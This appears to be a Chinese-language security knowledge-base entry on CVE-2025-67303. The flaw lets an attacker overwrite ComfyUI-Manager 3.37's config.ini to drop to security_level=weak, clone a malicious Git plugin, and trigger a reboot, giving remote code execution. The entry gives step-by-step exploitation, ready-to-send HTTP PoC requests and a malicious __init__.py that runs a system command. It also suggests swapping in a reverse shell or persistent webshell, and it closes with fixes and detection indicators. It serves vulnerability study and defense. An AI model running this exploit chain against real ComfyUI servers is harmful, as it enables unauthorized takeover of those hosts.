---
id: web-python-comfyui-manager-weak-config-git-clone-reboot-rce
title: ComfyUI-Manager 3.37 security_level=weak 放行高权限接口：上传 config.ini + git_url 克隆恶意节点 + reboot 触发 RCE（CVE-2025-67303）
type: scenario
domain: web
path: web/python
technique: comfyui-manager-weak-config-plugin-rce
aliases:
- CVE-2025-67303
- ComfyUI RCE
- ComfyUI-Manager 权限绕过 RCE
- security_level weak 绕过
- customnode install git_url
- manager reboot 触发 RCE
tags:
- python
- comfyui
- comfyui-manager
- rce
- config-overwrite
- security-level-bypass
- plugin
- git-clone
- cve-2025-67303
cve:
- CVE-2025-67303
severity: critical
confidence: high
status: verified
affected_versions: ComfyUI-Manager 3.37（原文标记为唯一漏洞版本，v3.40+ 已修复）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:00:21+08:00'
  notes: 已对照原文与12张图核对：/api/userdata/ComfyUI-Manager%2fconfig.ini 上传200、is_allowed_security_level 在 weak 下放行 high/middle、git_url 克隆 comfyui-manager-calc 返回200、reboot 后 [MALICIOUS] 插件加载并弹 calc，均与图01-12一致；原文明确影响版本 3.37、v3.40+修复。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

ComfyUI-Manager 3.37 的 `is_allowed_security_level()` 在 `security_level=weak` 时无条件放行所有接口，而 `config.ini` 又存放在 ComfyUI 原生 `/api/userdata/` 可写目录且优先级最高；攻击者先用无鉴权上传覆盖 `config.ini` 把级别改成 `weak`，再调用 `/customnode/install/git_url` 把含恶意 `__init__.py` 的 Git 仓库克隆进 `custom_nodes/`，最后调用 `/manager/reboot` 让 ComfyUI 重启并自动导入插件，形成完整 RCE（CVE-2025-67303）。

## 原理

- **配置可写且优先加载**：ComfyUI-Manager 3.37 按优先级查找 `config.ini`，第一优先是 `./user/default/ComfyUI-Manager/config.ini`。该路径位于 ComfyUI 原生 `/api/userdata/{file}` 的可写范围内；`post_userdata()` 只用 `get_request_user_filepath()` 做了目录包含校验（`os.path.commonpath`），并未限制文件类型/扩展名，因此可以直接 PUT/POST 一个名为 `config.ini` 的配置文件。
- **weak 级别无条件放行**：`is_allowed_security_level(level)` 的实现中，`level == 'high'` 时只要 `core.get_config()['security_level'] == 'weak'` 就返回 True；`level == 'middle'` 也在 `['weak','normal','normal-']` 中放行。于是把 `security_level` 设为 `weak` 后，要求 high/middle 权限的接口全部可访问。
- **高权限接口 1——写插件**：`POST /customnode/install/git_url` 读取请求体作为 Git URL，调用 `core.gitclone_install(url)`，把远程仓库克隆到 `custom_nodes/`。该目录是 ComfyUI 启动时扫描的插件目录。
- **插件加载机制**：ComfyUI 启动/重启时遍历 `custom_nodes/` 一级子目录，若存在 `__init__.py` 就作为插件包导入，导入会执行 `__init__.py` 顶层代码，且以 ComfyUI 进程权限运行，没有内容校验或白名单。
- **高权限接口 2——触发**：`GET /manager/reboot` 在通过权限检查后关闭 stdout 并退出当前进程，由外部启动方式重新拉起 ComfyUI；重启时恶意插件被导入，`__init__.py` 中的命令执行。
- 三步合起来把“配置覆盖 → 安全级别降级 → 任意仓库克隆 → 重启加载”串成完整 RCE。原文实测：覆盖 config.ini 后 `git_url` 返回 200，`custom_nodes/comfyui-manager-calc` 出现，重启时控制台打印 `[MALICIOUS] ComfyUI-Manager-Calc loaded! Executing payload...` 并弹出计算器。

## 触发条件

- ComfyUI 搭配 ComfyUI-Manager 3.37（原文复现 ComfyUI v0.7.0；v3.40+ 已修复）。
- ComfyUI 的 `/api/userdata/`、`/customnode/install/git_url`、`/manager/reboot` 可达；默认部署通常无前置认证（原文请求 `Comfy-User` 为空即可上传）。
- 目标可出网访问攻击者的 Git 仓库（原文通过代理访问 GitHub；也可用内网 Git 服务）。
- ComfyUI 进程对 `user/default/ComfyUI-Manager/` 与 `custom_nodes/` 有写权限；重启由进程管理器/启动脚本负责（接口会 `os._exit(0)`）。

## 利用步骤

1. 向 `/api/userdata/ComfyUI-Manager%2fconfig.ini` POST 完整配置，将 `security_level` 设为 `weak`（需带 `[default]` 段及合法键值，避免 Manager 读取异常）。
2. 准备一个公开 Git 仓库，根目录包含恶意 `__init__.py`（如执行 `calc`、写文件或反弹 shell），并确保可被目标 clone。
3. 调用 `POST /customnode/install/git_url`，请求体直接放仓库 URL；成功后仓库被克隆到 `custom_nodes/` 下。
4. 调用 `GET /manager/reboot`，ComfyUI 退出并由启动脚本重新拉起；插件目录被扫描，恶意 `__init__.py` 自动导入执行。
5. 通过命令回显（计算器、写成功文件、回连）确认 RCE；若需长期控制，可把 payload 换成内存马/定时任务/反弹 shell。

## PoC

```http
POST /api/userdata/ComfyUI-Manager%2fconfig.ini HTTP/1.1
Host: 127.0.0.1:8188
Content-Type: application/octet-stream

[default]
preview_method = none
git_exe = 
use_uv = False
channel_url = https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main
share_option = all
bypass_ssl = False
file_logging = True
component_policy = workflow
update_policy = stable-comfyui
windows_selector_event_loop_policy = False
model_download_by_agent = False
downgrade_blacklist = 
security_level = weak
always_lazy_install = False
network_mode = public
db_mode = cache
```

```http
POST /customnode/install/git_url HTTP/1.1
Host: 127.0.0.1:8188
Content-Type: text/plain

https://github.com/<attacker>/comfyui-manager-calc.git
```

```http
GET /manager/reboot HTTP/1.1
Host: 127.0.0.1:8188
```

```python
# 恶意仓库根目录 __init__.py（示例）
import os
print("[MALICIOUS] ComfyUI-Manager-Calc loaded! Executing payload...")
os.system("calc.exe")
```

```text
# 原文验证：重启后控制台打印 [MALICIOUS] ... loaded! Executing payload...
# 目标主机弹出计算器（calc.exe），确认以 ComfyUI 进程权限执行命令
```

## 变体与关联

- 变体：若 `/api/userdata/` 不可写，可尝试其他能写 `config.ini` 的入口（模型/工作流导入、日志路径等）；若目标不能出网，可让 `git_url` 指向内网可达的 Git 服务。
- 变体：把恶意插件换成直接写入 `custom_nodes/<name>/__init__.py` 的其他文件写入原语，同样在 reboot 时触发。
- 关联：同库中各类“配置/文件写入 + 插件或模板加载”的 RCE 链（如主题/插件目录写入后重启加载）；通用原理是“配置降级 + 插件目录写入 + 重启加载”，与 Web 应用的“模板/插件上传 getshell”同构。
- 边界：ComfyUI-Manager 3.37 之外的版本（尤其 v3.40+）已修复 weak 放行与配置读取逻辑；接口默认无认证但若部署在反向代理鉴权后则门槛提高；`os._exit(0)` 后能否自动拉起取决于部署方式。

## 检测与防御

- 修复：升级 ComfyUI-Manager 至 v3.40+，其已修复 `config.ini` 读取与权限校验逻辑、移除 `weak` 无条件放行并强化接口参数过滤。
- 加固：不要把 ComfyUI 直接暴露公网；在反向代理层增加认证与访问控制；`user/default` 与 `custom_nodes/` 目录限制应用外写入；对 `git_url` 安装来源做白名单/签名校验。
- 检测：`/api/userdata/` 出现 `config.ini` 写入（尤其 `security_level = weak`）；`/customnode/install/git_url` 请求体为未知 Git 地址；`custom_nodes/` 新增可疑目录及 `__init__.py`；`/manager/reboot` 异常调用；重启日志出现陌生插件导入与命令执行痕迹。
